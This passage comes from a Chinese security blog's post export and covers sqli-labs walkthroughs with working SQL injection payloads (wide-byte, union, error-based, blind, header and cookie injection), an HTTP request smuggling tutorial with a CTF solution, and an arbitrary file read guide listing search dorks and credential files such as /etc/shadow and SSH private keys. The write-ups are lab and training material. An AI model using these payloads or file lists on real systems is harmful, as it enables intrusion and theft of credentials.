在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 前提条件要有宽字节注入漏洞 首先要满足目标程序使用双/多字节字符集进行解析 其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符\\。 原理宽字节（两字节）带来的安全问题主要是吃ASCII字符（一字节）的现象，使用一些特殊字符来”吃掉“经过转义符 “ \\ ” 。注意 宽字节不只是出现在GBK编码，在PHP中，通过iconv()进行编码转换时，也可能出现宽字节注入。 这里所说的编码问题不是出现在HTML页面编码，而是与数据库的编码形式有关，一般我们在建立一个数据库的时候会让我们选择数据库的编码形式，所以有时候网站虽然是UTF-8写的，但是如果数据库是GBK的形式，也会出现宽字节。 MySQL中用于转义的函数 addslashes、mysql_real_escape_string、mysql_escape_string以及后面在高版本被去除的magic_quote_gpc 绕过方法因为宽字节注入主要是吃掉 \\ ，所以一般时候加一个 %df 这种就可以吃掉，其实加三个%df也可以吃掉，只要是奇数个%df即可。Less-32(绕过addslashes())测试后发现单引号双引号都不会报错,并且被\\转义了，所以可以用宽字节注入%df&#39;报错。&#39;被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C 所以 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是運&#39;，即%df\\’ = %df%5c%27=運&#39; 然后再测试，发现是单引号闭合。于是试了下爆库id=0%df' union select 1,2,database() --+ Less-33跟less-32多大区别，宽字节注入即可。Less-34(绕过添加斜杠)POST型的宽字节。uname=0%df' union select 1,database()#&amp;passwd=&amp;submit=Submit Less-35整型注入,不需要闭合id=0 union select 1,2,database() --+ Less-36查看源码，用了函数mysql_real_escape_string()，转义成功返回这些字符串，失败返回false。宽字节注入，参考Less-32Less-37Less-34一样，只是过滤函数不同，使用函数mysql_real_escape_string()Less-38参考Less-32 后记Page-这次又收获了一些注入方法：二次注入、GET型过滤敏感关键字注入、WAF绕过注入、宽字节注入。继续努力。。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://qwzf.gitee.io/blog/tags/SQL/"},{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"二次注入","slug":"二次注入","permalink":"https://qwzf.gitee.io/blog/tags/二次注入/"},{"name":"过滤敏感关键字与WAF绕过","slug":"过滤敏感关键字与WAF绕过","permalink":"https://qwzf.gitee.io/blog/tags/过滤敏感关键字与WAF绕过/"},{"name":"宽字节注入","slug":"宽字节注入","permalink":"https://qwzf.gitee.io/blog/tags/宽字节注入/"}],"author":"qwzf"},{"title":"sqli-labs攻关3(Less-11_Less-22)","slug":"sqli-labs攻关3(Less-11-Less-22)","date":"2019-11-06T15:55:21.000Z","updated":"2019-11-16T17:04:02.242Z","comments":true,"path":"2019/11/06/sqli-labs攻关3(Less-11-Less-22)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/11/06/sqli-labs攻关3(Less-11-Less-22)/","excerpt":"","text":"前言好久没打sqli-labs了，闲来无事继续打一下。 一、联合查询-POST型Less-11 &#39;1.注入点判断uname=admin\\&amp;passwd=&amp;submit=Submit 通过添加反斜杠\\，得知是&#39;闭合注入测试uname=admin' or 'a'='a&amp;passwd=1&amp;submit=Submit 或uname=admin' and 1=1#&amp;passwd=&amp;submit=Submit 2.显示位判断uname=不存在的用户' union select 1,2 #&amp;passwd=&amp;submit=Submit 显示位有1、2两处3.获取所有数据库名uname=1' union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#&amp;passwd=&amp;submit=Submit 获取当前数据库名uname=1' union select database(),2 #&amp;passwd=&amp;submit=Submit 4.获取所有数据表名uname=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=&amp;submit=Submit 4.获取所有字段名uname=1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"users\"#&amp;passwd=&amp;submit=Submit 5.获取所有数据 uname=1' union select 1,group_concat(password) from users#&amp;passwd=&amp;submit=Submit Less-12 &quot;)注入点判断通过添加反斜杠\\，得知是&quot;)闭合注入测试uname=admin\") or (\"a\"=\"a&amp;passwd=1&amp;submit=Submit 或uname=admin\") and 1=1#&amp;passwd=1&amp;submit=Submit 爆数据库、数据表、字段、记录和Less-11类似。 二、报错注入POST型因为总结过，所以这里不再总结。CSDN报错注入或个人博客报错注入 Less-13 &#39;)注入点判断通过添加反斜杠\\，得知是&#39;)闭合。进行其它注入操作时，发现没有回显。而加反斜杠测试闭合方式却有回显，因为产生报错。于是想到进行其它注入操作时，应该可以使用报错注入(这里暂且使用Xpath注入，也可以使用其它报错注入方式)。爆数据库uname=1') and (updatexml(1,concat(0x7e,(select database()),0x7e),1))#&amp;passwd=&amp;submit=Submit 爆表uname=1') and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1))#&amp;passwd=&amp;submit=Submit 爆字段uname=1') and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"users\"),0x7e),1))#&amp;passwd=&amp;submit=Submit 爆数据uname=1') and (updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1))#&amp;passwd=&amp;submit=Submit Less-14 &quot;通过添加反斜杠\\，得知是&quot;闭合其它注入操作，把Less-13的&#39;)改为&quot;即可。 三、盲注POST型Less-15post传入uname=admin\\&amp;passwd=&amp;submit=Submit 通过添加反斜杠\\，没有回显闭合方式，只回显了登录失败页面。尝试万能语句' or 1=1# 登录成功。发现登录成功和登录失败回显不同。于是想到了另一种思路来做，即SQL盲注，并且是POST型的布尔盲注，因为之前总结过GET型的SQL盲注，还做了几道POST盲注的题。所以这里不再详细总结。CSDN：sqli-labs攻关2(布尔盲注、时间盲注)或个人博客sqli-labs攻关2(布尔盲注、时间盲注)/#more)先知社区：SQL盲注的简单分析 测试测闭合方式uname=admin'#&amp;passwd=&amp;submit=Submit 单引号闭合 测长度uname=admin' and (length(database())=8)#&amp;passwd=&amp;submit=Submit 数据库长度为8测字符uname=admin' and (ascii(substr(database(),1,1))&gt;97)#&amp;passwd=&amp;submit=Submit 说明数据库第一个字符ASCII码大于97 具体注入步骤，参考SQL盲注的简单分析 Less-16依旧是SQL盲注，与Less-15相比，闭合方式由&#39;变成了&quot;) 当然，布尔盲注的题可以用时间盲注的方法来做，只不过时间盲注效率有点低。 四、POST注入1、基于错误POST更新查询注入过滤函数：check_input()Less-17查看源码发现，check_input()对传入的uname进行了限制 ，只能16个字符。调用了get_magic_quotes_gpc() 将 &#39; &quot; 空格 / 进行了转义。却没有对passwd进行任何处理。 所以与Less-14相比，注入点不在uname，注入点在passwd。测试发现闭合方式为&#39;。这里测试个爆数据库的。爆库uname=admin&amp;passwd=1' or updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;submit=Submit 但当我测试到爆数据时，却没爆出来，回显信息为：You can't specify target table 'users' for update in FROM clause 查询百度和大师傅博客，发现解决方法：在外面加一层select即可解决。payloaduname=admin&amp;passwd=' or updatexml(1,concat(0x7e,(select username from (select username from users)b limit 0,1),0x7e),1)#&amp;submit=Submit 2、User-Agent注入很多网站都会记录用户的User-Agent， 这为注入提供了条件。注入原理后台在接收UA时没有对UA做过滤，也没有PDO进行数据交互（实际PDO是非常有必要的），导致UA中有恶意代码，最终在数据库中执行。Less-18登录框输入admin 123，登录失败只有如下信息输入admin admin，登录成功返回如下信息猜测应该是在User-Agent进行注入。于是FireFox + Burp或Firefox+hackbar插件。测注入点User-Agent: 1' 报错回显发现这里果然存在注入。测闭合方式User-Agent: 1' and '1'='1 回显发现是&#39;闭合方式。于是开始其它注入操作爆库User-Agent: 1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1 爆表、爆字段、爆数据，后面的和Less-13大致一样，不再测试。 3、Referer注入Less-19先登录，登录成功，得到回显：猜测应该是在header里的Referer里进行注入测注入点Referer: 1' 测闭合方式Referer: 1' and '1'='1 爆库 Referer: 1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1 其它注入操作和Less-18类似。 4、Cookie注入Less-20和上两道题一个路数，先登录，得到回显猜测应该是在header里的Cookie里进行注入测注入点Cookie: uname=admin' 测闭合方式Cookie: uname=admin' and '1'='1 爆库Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1 Less-21登录，发现Cookie中为base64，解码得到admin猜想只是比Less-20多了一个Base64对admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1进行base64编码。Cookie: uname=YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIGFuZCAnMSc9JzE= 测试，得到数据库Less-22把Less-21单引号改为双引号。即对admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) and &quot;1&quot;=&quot;1进行base64编码。 后记至此，总算把Page-1的SQL注入关卡打完了。总的来说，22个sqli-labs关卡主要涉及的SQL注入的姿势有： GET型错误型注入、联合查询注入、报错注入、盲注、导出文件注入 POST型联合查询注入、报错注入、盲注 POST注入","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://qwzf.gitee.io/blog/tags/SQL/"},{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"POST型联合查询注入","slug":"POST型联合查询注入","permalink":"https://qwzf.gitee.io/blog/tags/POST型联合查询注入/"},{"name":"POST型报错注入","slug":"POST型报错注入","permalink":"https://qwzf.gitee.io/blog/tags/POST型报错注入/"},{"name":"POST型盲注","slug":"POST型盲注","permalink":"https://qwzf.gitee.io/blog/tags/POST型盲注/"}],"author":"qwzf"},{"title":"从一道题到HTTP请求走私","slug":"从一道题到HTTP请求走私","date":"2019-10-27T15:13:44.723Z","updated":"2019-11-06T16:52:47.705Z","comments":true,"path":"2019/10/27/从一道题到HTTP请求走私/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/10/27/从一道题到HTTP请求走私/","excerpt":"","text":"0x00 写在前面首发在先知社区 之前一次线上赛，遇到一道Web题，涉及了HTTP请求走私。由于之前未学习过，从而我展开了HTTP请求走私的学习之旅。 0x01 HTTP请求走私是什么HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。 0x02 为什么会产生HTTP请求走私请求走私漏洞成因 前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。 大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length标头和Transfer-Encoding标头。同时使用两种不同的方法时，Content-Length无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。 RFC2616规范 如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。 由于规范默许可以使用Transfer-Encoding和Content-Length处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将Transfer-Encoding隐藏在服务端的一个chain中时，它将会回退到使用Content-Length去发送请求。 走私攻击实现当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。 扩展：为什么会出现多次请求这与最为广泛的HTTP 1.1的协议特性——Keep-Alive&amp;Pipeline有关。在HTTP1.0之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。而现代的Web页面是由多种资源组成的，要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种资源，如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在HTTP1.1中，增加了Keep-Alive和Pipeline这两个特性。 Keep-Alive：在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在HTTP1.1中默认开启的。Pipeline(http管线化)：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。 现在，浏览器默认不启用Pipeline的，但是一般的服务器都提供了对Pipleline的支持。下面这是典型的CDN加速图和拓扑结构图CDN加速图拓扑结构图 0x03 如何执行HTTP请求走私攻击HTTP请求走私攻击涉及将Content-Length标头和Transfer-Encoding标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为： CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。 0x04 HTTP请求走私攻击的五种方式CL不为0所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。 构造请求示例：GET / HTTP/1.1\\r\\nHost: test.com\\r\\nContent-Length: 44\\r\\nGET / secret HTTP/1.1\\r\\nHost: test.com\\r\\n\\r\\n \\r\\n是换行的意思，windows的换行是\\r\\n，unix的是\\n，mac的是\\r 攻击流程：前端服务器收到该请求，读取Content-Length，判断这是一个完整的请求。然后转发给后端服务器，后端服务器收到后，因为它不对Content-Length进行处理，由于Pipeline的存在，后端服务器就认为这是收到了两个请求，分别是： 第一个：GET / HTTP/1.1\\r\\nHost: test.com\\r\\n 第二个：GET / secret HTTP/1.1\\r\\nHost: test.com\\r\\n 所以造成了请求走私。 CL-CLRFC7230规范 在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。 有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。构造请求示例：POST / HTTP/1.1\\r\\nHost: test.com\\r\\nContent-Length: 8\\r\\nContent-Length: 7\\r\\n12345\\r\\na 攻击流程：中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母a，对于后端服务器来说，这个a是下一个请求的一部分，但是还没有传输完毕。如果此时有一个其他的正常用户对服务器进行了请求：GET /index.html HTTP/1.1\\r\\nHost: test.com\\r\\n 因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母a的后面，当后端服务器接收完毕后，它实际处理的请求其实是：aGET /index.html HTTP/1.1\\r\\nHost: test.com\\r\\n 这时，用户就会收到一个类似于aGET request method not found的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。 但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？所以想到前面所说的RFC2616规范 如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length。 所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。 CL-TECL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。 chunk传输数据(size的值由16进制表示)[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] chunked编码参考：http协议中content-length 以及chunked编码分析构造请求示例：POST / HTTP/1.1\\r\\nHost: test.com\\r\\n......Connection: keep-alive\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\na 连续发送几次请求就可以获得响应。攻击流程：由于前端服务器处理Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是0\\r\\n\\r\\na 当请求包经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到0\\r\\n\\r\\n 认为已经读取到结尾了。但剩下的字母a就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：aPOST / HTTP/1.1\\r\\nHost: test.com\\r\\n...... 服务器在解析时就会产生报错了，从而造成HTTP请求走私。 TE-CLTE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding请求头，后端服务器处理Content-Length请求头。构造请求示例：POST / HTTP/1.1\\r\\nHost: test.com\\r\\n......Content-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n12\\r\\naPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n 攻击流程：前端服务器处理Transfer-Encoding，当其读取到0\\r\\n\\r\\n 认为是读取完毕了。此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，因为请求体的长度为4.也就是当它读取完12\\r\\n 就认为这个请求已经结束了。后面的数据就认为是另一个请求：aPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n 成功报错，造成HTTP请求走私。 TE-TETE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理Transfer-Encoding请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理Transfer-Encoding请求头。在某种意义上这还是CL-TE或者TE-CL。构造请求示例：POST / HTTP/1.1\\r\\nHost: test.com\\r\\n......Content-length: 4\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-encoding: cow\\r\\n\\r\\n5c\\r\\naPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n 攻击流程：前端服务器处理Transfer-Encoding，当其读取到0\\r\\n\\r\\n 认为是读取结束。此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理Transfer-encoding请求头，将Transfer-Encoding隐藏在服务端的一个chain中时，它将会回退到使用Content-Length去发送请求。读取到5c\\r\\n 认为是读取完毕了。后面的数据就认为是另一个请求：aPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n 成功报错，造成HTTP请求走私。 0x05 HTTP请求走私实战在我学HTTP请求走私之前，正是因为碰到一道Web题要使用HTTP请求走私。现在复现一下 RoarCTF2019-Web：easy_calc进去发现是个计算器这道题是国赛的love_math的修改版。国赛题love_math参考Smi1e师傅的Writeup：国赛love_math题解输入calc.php，发现了网站源码这道题除去了长度限制，payload中不能包含 ‘ ‘, ‘\\t’, ‘\\r’, ‘\\n’,’’’, ‘“‘, ‘`‘, ‘[‘, ‘]’等字符 师傅的Writeup还说网站加了waf，需要绕过waf。所以还需要绕过waf，测试发现当我们提交一些字符时，会直接403。403？！应该就是走私报错了，经测试发现的确存在服务器存在http走私漏洞，可以用来绕waf。 因禁了一些字符，所以不能直接getflag，需要继续分析payload构造。 相关PHP函数scandir() 函数返回指定目录中的文件和目录的数组。base_convert() 函数在任意进制之间转换数字。dechex() 函数：把十进制转换为十六进制。hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。readfile() 函数输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。 HTTP走私绕过WAF测试示例1、HTTP请求走私测试2(CL-CL漏洞)两个CL直接导致前端转发的服务器400，而且完整转发了post包给后端。2、HTTP请求走私测试1(CL-TE漏洞)CL和TE直接导致前端转发的服务器400，而且完整转发了post包给后端。其它几种请求走私依旧可以，就不测试了。 构造payload获得Flag使用scandir()函数、readfile()函数、base_convert()函数、dechex() 函数、hex2bin() 函数（chr()函数）36进制scandir-&gt;10进制6169338629136进制readfile-&gt;10进制2146934604002ascii码/-&gt;16进制2f-&gt;10进制4736进制f1agg-&gt;10进制25254448(读取根目录得到的)1、列目录首先要使用scandir()函数，尝试构造payload列举根目录下的文件。scandir()可以用base_convert()函数构造，但是利用base_convert()只能解决a~z的利用。因为根目录需要/符号，且不在a~z,所以需要hex2bin(dechex(47))这种构造方式，dechex() 函数把十进制数转换为十六进制数。hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。当然，也可以直接用chr()函数 payloadvar_dump(base_convert(61693386291,10,36)(chr(47))) 2、读取flag payloadvar_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36))) PHP字符串解析特性绕过WAF输入时发现num只能输入数字，输入字符无法解析。这里可以利用php的字符串解析特性绕过bypass：利用PHP的字符串解析特性Bypass PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符2.将某些字符转换为下划线（包括空格） 所以我们可以在num前加个空格绕过wafhttp://www.xxx.com/index.php? num=aaaa 现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码还能正常运行，还上传了非法字符。然后再利用scandir()函数，列出 参数目录 中的文件和目录。首先，要先扫根目录下的所有文件，也就是是scandir(&quot;/&quot;),因为/被过滤了，所以直接用chr(“47”)绕过,发现flagg文件然后再去读取这个文件就行了。payload：calc.php? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 0x06 漏洞修复1、将前端服务器配置为只使用HTTP/2与后端系统通信2、完全禁用后端连接重用来解决此漏洞的所有变体3、确保连接中的所有服务器运行具有相同配置的相同web服务器软件。4、彻底拒绝模糊的请求，并删除关联的连接。5、在Burp Suite中，你可以使用Repeater菜单禁用此行为，确保你选择的工具具有相同的功能。6、通过Squid之类的代理来测试他们的测试人员的流量以进行监控。破坏测试人员发起的任何走私攻击请求，确保对此漏洞做到全面杜绝。 0x07 写在后面这次又学到了新的知识-HTTP请求走私。了解了HTTP请求走私的五种方式，以及一些PHP函数的使用。HTTP请求走私属于协议层攻击，是服务器漏洞的一种，应予以注意。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://qwzf.gitee.io/blog/tags/HTTP/"},{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"协议层","slug":"协议层","permalink":"https://qwzf.gitee.io/blog/tags/协议层/"}],"author":"qwzf"},{"title":"任意文件读取与下载漏洞","slug":"任意文件读取与下载漏洞","date":"2019-10-18T17:01:11.511Z","updated":"2019-10-18T17:08:23.673Z","comments":true,"path":"2019/10/19/任意文件读取与下载漏洞/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/10/19/任意文件读取与下载漏洞/","excerpt":"","text":"0x00前言上周参加了一个线上赛。有个Web题的WriteUp说是任意文件下载。由于之前没学过，所以就没有想到。现在学习一下 0x01为什么产生任意文件读取与下载漏洞 一些网站的业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源文件，敏感文件等等。 0x02任意文件读取漏洞任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。漏洞产生原因 存读取文件的函数 读取文件的路径用户可控，且未校验或校验不严 输出了文件内容 任意文件读取&lt;?php $filename=”test.txt”;readfile($filename);?&gt; &lt;?php$filename=”test.txt”;echo file_get_contents($filename);?&gt; 文件读取函数readfile()、file_get_contents()、fopen()中，$filename没有经过校验或者校验不合格，用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini。 0x03任意文件下载漏洞一些网站由于业务需求，往往需要提供文件下载功能，但若对用户下载的文件不做限制，则恶意用户就能够下载任意敏感文件，这就是文件下载漏洞。漏洞产生原因 有读取文件的函数 读物文件的路径用户可控，且没有经过校验，或者校验不严格 输出文件内容 一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字 文件下载的两种方式1、直接下载：&lt;a href=”http://www.a.com/xxx.rar”&gt;下载&lt;/a&gt; 2、增加header头&lt;?php $filename = $_GET['filename']; echo '&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;'; echo file_get_contents($filename); header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); header('Content-Lengh: '.filesize($filename));?&gt; 漏洞利用方式利用思路 下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置 下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。 下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。 尝试读取/root/.bash_history看自己是否具有root权限。如果没有，就只能利用../来回跳转读取一些.ssh下的配置信息文件。读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载需要审计的代码文件，但是下载的时候变得很繁琐，只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。 一些常见利用方式 java+oracle环境可以先下载/WEB-INF/classes/applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器。 也可以先下载网站的配置文件，在根目录/WEB-INF/Web.xml的(一般都有很多内容,有时含有数据库连接用户名和密码等关键信息)。 具有root权限在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。 当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞将mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。locate 读取方法locate mlocate.db admin 可以将mlocate.db中包含admin内容全部输出来。利用这个文件可以获取到该服务器任何我们想要的内容并下载出来而不用一个一个去猜解目录，但是这个文件只有root用户才能读取。另一方面我们也可以利用linux内核的一个文件/proc/self/cmdline当前进程的cmdline参数，可以获取到路径信息。 总的来说，任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。 0x04任意文件读取与下载漏洞挖掘 1、web漏洞扫描器（awvs、appscan、openvas、nessus）2、手动挖掘从连接和参数名查看 Google searchinurl:”readfile.php?file=inurl:”read.php?filename=inurl:”download.php?file=inurl:”down.php?file= 连接：readfile.php?file=**.txtdownload.php?file=**.rar参数名：&amp;RealPath=、&amp;readpath=、&amp;FilePath=、&amp;filepath=、&amp;Path=、&amp;path=、&amp;Inputfile=、&amp;inputfile=、&amp;url=、&amp;urls=、&amp;Lang=、&amp;dis=、&amp;Data=、&amp;data=、&amp;readfile=、&amp;ﬁlep=、&amp;Src=、&amp;src=、&amp;menu=、META-INF= 、WEB-INF 0x05敏感信息Windows： C:\\boot.ini //查看系统版本C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件C:\\Windows\\repair\\sam //存储系统初次安装的密码C:\\Program Files\\mysql\\my.ini //Mysql配置C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql rootC:\\Windows\\php.ini //php配置信息C:\\Windows\\my.ini //Mysql配置信息 Linux： /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥/root/.ssh/known_hosts//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。/etc/passwd // 账户信息/etc/shadow // 账户密码文件/etc/my.cnf //mysql 配置文件/etc/httpd/conf/httpd.conf // Apache配置文件/root/.bash_history //用户历史命令记录文件/root/.mysql_history //mysql历史命令记录文件/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts //记录系统挂载设备/porc/config.gz //内核配置文件/var/lib/mlocate/mlocate.db //全文件路径/porc/self/cmdline //当前进程的cmdline参数 0x06任意文件读取与下载漏洞验证任意文件读取验证示例代码：&lt;?php$filename=$_GET['f'];echo file_get_contents($filename);?&gt; 